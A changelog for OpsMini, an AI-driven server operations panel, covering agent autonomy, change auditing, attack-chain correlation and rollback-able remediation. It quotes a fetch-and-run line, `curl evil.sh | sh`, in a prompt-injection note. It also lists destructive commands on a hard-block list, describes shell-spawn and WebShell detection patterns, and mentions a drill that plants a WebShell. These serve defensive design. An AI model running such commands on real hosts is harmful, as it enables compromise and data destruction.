# Changelog

Change records for each version.

## v1.4.0 (2026-11-02)

**From "can remediate" to "remediation with evidence"**

v1.3 taught the Agent to find problems on its own and act within boundaries. v1.4 fills in the other side: **understand what happened before acting**, and after acting, be able to explain what was done and whether it can be undone.

In one sentence, this release: **every change on a host is recorded, judged, and correlated; every action is accounted for and rollback-able.**

**Change awareness (new)**

The most common line in operations troubleshooting is "I don't know what happened to it since it was last fine." This release closes that gap.

- Six categories of change sources are continuously collected: configuration files (line-by-line diff), software packages, service status, account permissions, firewall rules, cron jobs
- Attribution is graded in three levels and shown truthfully: `已确认` (can point to a specific person) / `推断` (probably who) / `未知`. No glossing over with the word "system"
- Each record carries the hash of the previous one, forming a **tamper-evident chain** that can be verified at any time; if deleted or altered, it breaks at that point
- diff is **redacted** before being written to the database (`password=`, `api_key=`, private key blocks)
- **Rule review** first scores with 0 tokens (0–1, with three to five reasons): high-risk path, whether the operator can be confirmed, whether the source is public network, whether it is outside working hours, whether there are high-risk events in the same period, whether it was produced by a package manager... Only when judged suspicious (≥0.55) does it escalate to an event and wake the Agent
- The Agent receives the **raw diff** for deep analysis and outputs "verdict / basis / recommendation", but has **no write permission whatsoever**
- Known noise can be given **ignore rules** (supporting `**` wildcards); on match, not even an event is produced
- Configuration and account changes retain the original file snapshot, can be rolled back directly from the detail page, and if that fails, rolled back again

**Attack chain and remediation transactions (autonomous loop closure)**

- **Attack chain**: strings "WebShell landing → suspicious process → outbound C2" into a single intrusion, five stages, shared indicators + temporal proximity scoring (≥0.45 merges). Deliberately tightened: standalone brute force does not open a chain, indicator and log spikes never enter a chain, and **a change is merged as a "persistence" stage only when all three conditions hold: judged suspicious + the change is in a location that survives reboot + landing or outbound has already appeared on the chain**
- **Remediation transactions**: reversible actions (isolate/freeze/block/truncate/snapshot) are **automatically rolled back in reverse order** when remediation fails; irreversible actions explicitly list "N items cannot be undone" and do not pretend to have been reverted. Individual actions can be manually rolled back on the panel
- **Shadow retrospective**: remediations run in shadow mode are later judged against the facts as `would_help` / `unnecessary` / `unknown` — consecutive `unnecessary` means the threshold should be tightened, consecutive `would_help` means it can be raised to assist
- **Feedback suppression**: if the same event group is ignored twice within 7 days, the Agent is no longer woken (still recorded)
- **Verification failure automatically retries once**, and feeds the previously blocked action and verification result back to the model to avoid repeating the same assumption
- The change page and attack chain are **bidirectionally navigable**; each stage of the attack chain is annotated with its source (WebShell / suspicious process / network outbound / change)

**Event noise reduction**

Metric alerts and log spikes are now "folded as long as the event is not remediated" — a single CPU rule no longer floods eight pending items in one night. The login anomaly window is widened from 1 hour to half a day. If an event recurs after being remediated, a new one is created as usual; recurrences are not swallowed.

**Log pipeline (new, disabled by default)**

Built-in collection executor **compatible with Filebeat configuration**, positioned like filebeat on a managed host, but without needing a separate process.

- Task directory `tasks.d` (one YAML per task), main configuration `main.yml` determines the output; existing filebeat configurations can be split apart and used directly
- **31 Filebeat processors**: field add/remove/modify, JSON/CSV/XML/syslog parsing, dissect, script, fingerprint, domain and network direction
- Three outputs: Elasticsearch, Kafka, Logstash (Lumberjack v2 + TLS)
- `at-least-once`: offset advances only after successful delivery; failures go to a disk queue and are resent from the confirmed position after a crash
- **No logs are collected by default**: it starts only when a task file appears, it is explicitly enabled, or a task is delivered from the platform
- The panel's "Logs → Pipeline" shows running status, per-task read rate, and backlog, and can **preview the last 20 events in real time** — no need to query ES first when tuning processors

**Plugin system (new)**

The kernel only does what every host needs; business capabilities are delegated to plugins.

- Plugins are **independent processes** that report metrics, events, and heartbeats over a Unix socket using line-delimited JSON; a crash does not affect the panel
- Packages must carry sha256 and ed25519 signatures; installation verifies the signature, `apiVersion`, platform, and version requirements in order
- Lifecycle: install → enable → run → disable → upgrade (old version retained for rollback) → delete
- **Honest disclosure**: in this release, plugins run as the same user as the panel, **without** a dedicated system user or cgroup limits; `capabilities` is a declaration, not enforcement. The meaning of the signature is "trusted origin", not "safe behavior"
- A public key must be configured in settings or unsigned mode enabled before installation (restart the panel after changing); official plugin packages have not yet been released, so an empty plugin page is the expected state

**Backup and restore (new)**

- Three backup targets: directory/file, `mysql:库名`, `redis:路径`, `tar.gz` + `manifest.json` (including sha256 per chunk)
- Backup is truly one-click; **restore is not**: pre-check → automatic snapshot before restore → execute → automatic rollback on health check failure, and the snapshot name must be typed to confirm
- Retention count is cleaned up by whole directory; individual chunks are never deleted
- Backup is **the fourth type of cron job**, using the same engine as manual backup; failures are written back to the task status and trigger the "backup failure count" alert
- Remote storage (S3-compatible / SFTP) code is ready, but **not part of this release's deliverables**; it takes effect only when manually configured in `config.yaml`, and has not been tested on real machines

**Other**

- Alert rules 12 → 24, baseline checks 13 → 45
- AI large model integration supports four protocols: OpenAI / Anthropic / Azure / Gemini; the model list can be fetched and selected, no more typing model names by hand
- **Injection protection** for Agent prompts: untrusted content (diff body, usernames, paths) cannot forge paragraph boundaries or close code fences early; the content itself is unchanged — `curl evil.sh | sh` must be delivered to the model as-is, because it is the conclusion
- Event center aggregate members can be expanded to view all (previously only the first few were shown)
- Fixes: `/files/du` empty path taking 15 seconds, change chain anchor false positives on existing databases, mobile change table being squeezed to one character per line
- Data directory unified to `/data/opsmini`; uninstall deletes the directory

**Upgrade notes**

Upgrading from v1.3.x only requires replacing the binary and restarting; the database migrates automatically. New default policies such as `change-review` are seeded idempotently by name, and old databases receive them too. The log pipeline and plugins are disabled by default, so upgrading will not start collecting or loading anything.

## v1.3.0 (2026-10-28)

**Autonomous Agent: from "you ask, it answers" to "it watches on its own"**

This version advances OpsMini from "an AI assistant that does work on command" to a resident Agent that "finds problems on its own, judges on its own, and acts within your boundaries." The core is a closed loop from collection to verification, not just a few more buttons.

**Perception layer (internal/sentinel)**

- Six types of collectors run continuously: log spikes (hourly-bucket EWMA baseline + 20MB/min hard threshold), login anomalies (non-working hours / first-seen IP / success after brute force / `authorized_keys` just changed), web directory script drops (14 types of WebShell signatures, strong signatures go straight to high), process spawning (web user starting shell / curl / python), suspicious outbound connections, metric alerts
- Collection results are uniformly normalized into **Signal**: fingerprint deduplication, persisted to SQLite; passed via in-process channel, no message queue introduced
- Collection frequency is tiered from 2s–20s; for anomalous logs, look up the process holding the file, avoiding "the log is growing but we don't know who is writing it"

**Event center**

- Signals are aggregated into **events** by fingerprint and time window; an event carries title, category, level, object, and occurrence count
- Six filters (pending / pending wake / all / handled / failed / ignored) all carry counts; selecting one shows the definition for that status
- Event details can drill down to related signals, Agent run records, and the per-step action chain (tool, parameters, verdict, raw output)

**Policy engine (internal/trigger)**

- Five built-in policies work out of the box: `webshell-respond`, `auth-anomaly`, `proc-anomaly` (critical only), `log-growth` (shadow mode), `net-anomaly` (disabled by default)
- The Agent is woken only when three conditions are met simultaneously: category matches, level reaches threshold, and not in cooldown; otherwise only the event is recorded, **without consuming model quota**
- Each policy can be configured with its own budget: write operation count, model steps, wall-clock duration, token limit; stop when any is exceeded
- Policies are data, not code: add, delete, modify, adjust thresholds, and switch modes in the UI without restarting

**Three run modes**

- `shadow` observe only: gather evidence as usual, write conclusions and "what it plans to do," execute no write operations; suitable for running for a few days to calibrate judgment first
- `assist` assist: read-only actions execute automatically, any write action stops and waits for human confirmation — the recommended daily setting
- `auto` autonomous: only low-risk actions in the `auto_tools` whitelist skip confirmation; L2 and above always require human approval

**Making irreversible actions reversible**

- Delete → **quarantine**: move files to the quarantine area, record original path, checksum, and permissions, restore with one click
- `kill -9` → **SIGSTOP freeze**: stop first to preserve the scene, decide after confirmation
- Permanent ban → **temporary ban with TTL**: automatically unbanned on expiry, a mistaken ban won't become an incident
- **Snapshot** before acting: keep a backup before changing config, roll back if verification fails

**Five safety gates (internal/safety)**

- Parameter policy, write budget, protected paths, killswitch, post-action assertion verification (`no_new_signal`, `port_listen`, `file_absent`, etc.)
- Events that fail verification are marked as failed and handed back to a human, rather than glossed over as success; empty reports also count as failure
- Every tool call goes into the action audit: who triggered it, what was called, what parameters were passed, what was returned

**Data retention**

- A new "Data Retention" page in panel settings: events and signals retained 30 days by default, action audit 180 days, quarantine items and ban records 30 days
- Pending events together with their signals and action chains are **never automatically deleted**; quarantined files are untouched until restored, bans untouched until unbanned
- Also added "Clear event history": clear everything at once regardless of retention window (including quarantined file copies and ban records, removing firewall rules, resetting policy cooldowns), executed after second confirmation

**Drill and verification**

- Added `scripts/chaos-drill.sh`: inject four types of faults (log spike / WebShell drop / SSH brute-force success / web user spawning shell), then use the API to verify whether the perception layer produces corresponding events
- All four scenarios passed on a public network test machine; in `auto` mode, a real WebShell was quarantined and verified successfully

**Other improvements**

- Login page copy changed to Agent positioning (7 languages), tab title follows login status
- Notification cards can be closed by clicking blank space on the page
- Build version stamp switched to `git describe --tags --dirty`, added `make release-check` release pre-check to avoid releasing with a dirty working tree

**Upgrade notes**

- v1.2.1 → v1.3.0: just replace the binary and restart; new tables are created automatically, no migration needed
- After upgrading, it is recommended to first look at the five built-in policies in "Event Center → Policies": by default they are all `assist` or `shadow`, and will not automatically change the system

## v1.2.1 (2026-10-27)

**Fix: remove four multi-host AI tools that crossed an architectural boundary**

v1.2.0 registered four multi-host tools (`list_remote_hosts` / `remote_exec` / `remote_pull_file` / `remote_push_file`) that let the panel's AI dispatch commands and files to other enrolled hosts through the OpsMini Server control-plane HTTP API on port 4508. That implementation crossed a boundary and has been removed:

- 4508 is an **internal** API the OpsMini Server offers to OpsAnt. It is scoped to "local host / internal network" and performs no authentication.
- On the multi-host path the panel is the **managed Agent**; it should talk to the Server only over the gRPC connection on 4507 (register, heartbeat, receive tasks) and must not call the control plane back.
- Making that design work would require exposing 4508 to the internet — i.e. publishing an unauthenticated remote command entry point.

The tool set therefore returns to **29** (16 read-only / 5 low-risk write / 8 high-risk write). Multi-host orchestration and multi-host AI belong to OpsAnt, which already provides a unified execution API (`/api/opsant/v1/tasks/run-shell/`, `tasks/run-script/`, `tasks/send-file/`, `tasks/get-minion-file/`, ...) plus the salt / ansible / opsmini engines.

**No migration needed**: those four tools required 4508 to be reachable and were never actually usable.

## v1.2.0 (2026-10-27)

**AI agent: from advisor to operator**

- **Self-built lightweight ReAct kernel**: a Reason → Act → Observe loop with no agent framework, keeping the single binary and CGO-free build intact; one turn is capped at 12 steps, after which the agent stops calling tools and reports what it already knows
- **33 built-in tools**: 16 read-only (system overview, processes, ports, disks, directory usage, log search, services, containers, security, ...), 5 low-risk writes, 8 high-risk writes, plus 4 multi-machine tools registered dynamically from the Agent configuration
- **Streaming tool calls**: `tool_calls` fragments are accumulated and stitched per index; vendors that cannot stream tool calls fall back to a non-streaming retry automatically
- **Visible thinking chain**: the UI shows step by step which tool ran, with what arguments, and its raw output, so the conclusion is auditable

**Tiered authorisation and human-in-the-loop**

- **Four-level risk model**: L0 read-only runs freely / L1 low-risk asks by default (an administrator may opt a tool into unattended execution) / L2 high-risk always asks and can never be exempted / L3 catastrophic operations are hard-blocked by pattern
- **L3 blocks before execution**: `rm -rf /`, `mkfs`, `dd of=/dev/sd*`, fork bombs, flushing the firewall, overwriting `/etc/passwd` and the like are refused even if an administrator approves them; two extra rules protect the panel itself (never touch the data directory, never close the panel port)
- **Suspend and resume**: a high-risk call is persisted and suspended; approving or rejecting it in the chat resumes the message sequence from SQLite. The rejection path was verified to leave no side effects

**Bidirectional MCP**

- **MCP client**: built on the official MCP Go SDK with both stdio and Streamable HTTP transports; tools of an external MCP server are exposed as `mcp__<server>__<tool>` and the configuration is reconciled every 2 minutes
- **MCP server**: publishes its own toolset on `/mcp` behind a Bearer token, exposing only L0/L1 tools by default (L2 is withheld from unauthorised clients because an external client cannot render the panel's approval dialog)

**Scheduled AI tasks**

- **A fourth scheduled-task kind, "Agent task"**: write a prompt and it runs on its cron schedule; scheduling, enable/disable, last-run bookkeeping and failure alerts are all reused from the existing machinery
- **Authorisation degrades when unattended**: nobody is around to click "Approve", so any tool mapping to L2 is refused outright and the reason is fed back to the model, which switches to read-only tools and states in the report that the operation needs a human, along with the exact command
- **Reliability and cost control**: per-task step budget and wall-clock timeout; three consecutive failures disable the task automatically, so a broken job cannot alert forever; saving the task clears the failure count
- **Five built-in inspection presets**: host inspection, security inspection, disk usage, service status, log anomalies, plus four common schedule presets

**Single-file HTML reports**

- **A report is one self-contained HTML file**: inline styles, no script, no external stylesheet, no web font, no images — it renders from a USB stick, as a mail attachment or from any static host
- **Open or download**: each task row offers "Open" (rendered directly in a new tab) and "Download"; Chinese file names are RFC 5987 encoded
- **Archived under the data directory**: both `.html` and `.md` land in `<data dir>/reports/<task name>/`, one subdirectory per feature for all generated artifacts
- **Safe rendering**: the body mixes model prose with host data (log excerpts, process command lines, config values); the renderer escapes the whole document before applying inline rules and only allows http/https/mailto targets, so a `<script>` in a log line is displayed as text. A strict CSP is sent as a second line of defence
- **When you need PDF**: use the browser's "Print → Save as PDF" on the open report; the stylesheet already carries print rules

**Notifications and audit**

- **Shared notifier**: notification dispatch was extracted from alerts into one `Notifier` (in-panel / email / WeCom / DingTalk / Feishu), so AI tasks and alerts behave identically; an empty channel list defaults to the in-panel bell
- **Audit trail**: AI tool calls are written to the audit log; refusals during unattended runs are recorded as `unattended-deny`, human rejections with a `reject:` prefix

**Other improvements**

- The sidebar version label now shows the real backend version instead of a hard-coded string
- Added the AI agent design document `docs/ai-agent.md` in 7 languages
- Administrators can tune per-tool policy under "AI Assistant → Tool permissions"; high-risk tools stay locked to "Ask first"

## v1.1.0 (2026-09-21)

**Multi-machine management (Agent / Server architecture)**

- **Agent gRPC client**: the Agent actively connects to OpsMini Server (single-port gRPC bidirectional stream), with heartbeat + exponential backoff reconnection; it receives execution / file tasks and reports results back
- **OpsMini Server side**: registration / heartbeat / connection management, execution task dispatch, and result reception (code migrated to the OpsAnt project as a standalone Go sub-project `opsmini-server/`; OpsMini retains only the Agent)
- **Command / script execution**: command and shell / python scripts, with results (stdout / stderr / exit code / elapsed time) reported back
- **File pull (PullFile)**: the Server pulls files from the Agent (chunked upload + size / md5 verification)
- **File push (PushFile)**: the Server pushes files to the Agent (chunking + resumable transfer + md5 verification), supporting a directory as the target (original filename preserved)
- **Connection status detection + long-lived connection keepalive**: Agent online / offline status, heartbeat timeout detection, gRPC keepalive
- **OpsAnt integration**: visually configure the OpsAnt address / Token on the panel "Settings" page (hot-swappable at runtime; the Token field supports an eye icon to toggle between plaintext and masked), SSO authentication-free redirect (enabled by default)
- **Removed the `/agent/v1` REST API**: switched to gRPC bidirectional streaming (the original REST API and the frontend "API Token" settings page were removed together)

**Panel feature enhancements**

- **Directory download on the file page**: one-click compression of a directory into a zip for download (dialog prompt + directory size + disk usage of the containing partition)
- **Directory deletion on the file page**: recursively delete directories (danger-operation dialog + secondary confirmation by typing the directory name)
- **Long-name optimization on the file page**: overlong file / directory names are truncated with an ellipsis, and hovering shows the full name (eliminates the horizontal scrollbar)
- **"Network" routing table in System Management**: added a routing table display below the network interfaces (destination network / gateway / subnet mask / flags / interface / metric)
- **MCP configuration enhancements**: supports both "Configuration file (JSON)" and "Table" input methods; SSE / HTTP methods support custom request headers (multiple) and a timeout
- **Firewall enhancements**: automatically allow the panel port and the SSH port (22) before enabling, preventing loss of access after enabling; recognizes ufw that is "installed but not enabled"
- **Prometheus metrics enhancements**: added `opsmini_cpu_usage_percent` / `opsmini_mem_usage_percent` real-time usage rates and the `node_procs_total` total process count
- **Unified confirmation dialog**: all deletion / dangerous operations now use the platform's built-in confirmation dialog (replacing the browser's native confirm)

**Terminal optimizations**

- **Output padding**: added left / right / bottom padding to command output so it no longer touches the edges
- **Fullscreen Esc fix**: pressing Esc in fullscreen mode no longer exits fullscreen (avoids conflict with Esc in vim editing mode)
- **Session persistence**: the terminal session is no longer reset after switching pages (kept within the session validity period)
- **Character set setting**: added character set selection (UTF-8 / GBK / GB18030 / Big5) to fix garbled Chinese text

**Experience optimizations**

- **Page title**: displays "OpsMini · access address" so multiple tabs can be distinguished
- **Password visibility**: added a "show / hide" eye icon to input fields such as password change and the OpsAnt integration Token
- **Settings page layout**: "Two-factor authentication" and "OpsAnt integration" are displayed side by side; the "Auto update" toggle was removed

## v1.0.0 (2026-09-13)

The first official release of OpsMini, delivered as a single binary, with core capabilities:

- **AI operations**: natural-language diagnostics, intelligent log analysis, command generation and execution (SSE streaming output), MCP tool integration
- **Monitoring and alerting**: time-series collection of CPU / memory / disk / network metrics, with alert rules supporting email, panel, WeCom, DingTalk, and Feishu group-bot notifications
- **Host security**: security score, baseline checks, File Integrity Monitoring (FIM), threat detection, firewall, login security
- **App store**: app categories + one-click install + official template sync
- **AI skills (Skill Hub)**: skill search, install, and upload
- **Web terminal**: WebSocket + pty interactive shell, multiple sessions
- **Routine operations**: websites, databases, scheduled tasks, file management
- **Two-factor authentication (2FA)**: global toggle + per-user TOTP binding
- **Monitoring export**: Prometheus `/metrics` endpoint (node_exporter compatible)
- **Notification management**: SMTP / WeCom / DingTalk / Feishu
- **Streamlined configuration**: JWT secret, Agent Token, and AI configuration are all managed in the panel; the configuration file keeps only minimal items
- **Logging system**: configurable log level (info / warn / error), logs written to disk
- **Account recovery**: `-reset-pass` / `-reset-mfa` subcommands
- **7-language i18n**: Simplified Chinese / Traditional Chinese / English / Japanese / Korean / Thai / German
- **White minimalist UI**: white + black text color scheme, accented with brand blue
- **Dual API**: `/api/v1` (for browsers) + `/agent/v1` (standard REST between machines)

> The complete version history is based on the repository Releases: [GitHub Releases](https://github.com/unixhot/opsmini/releases)
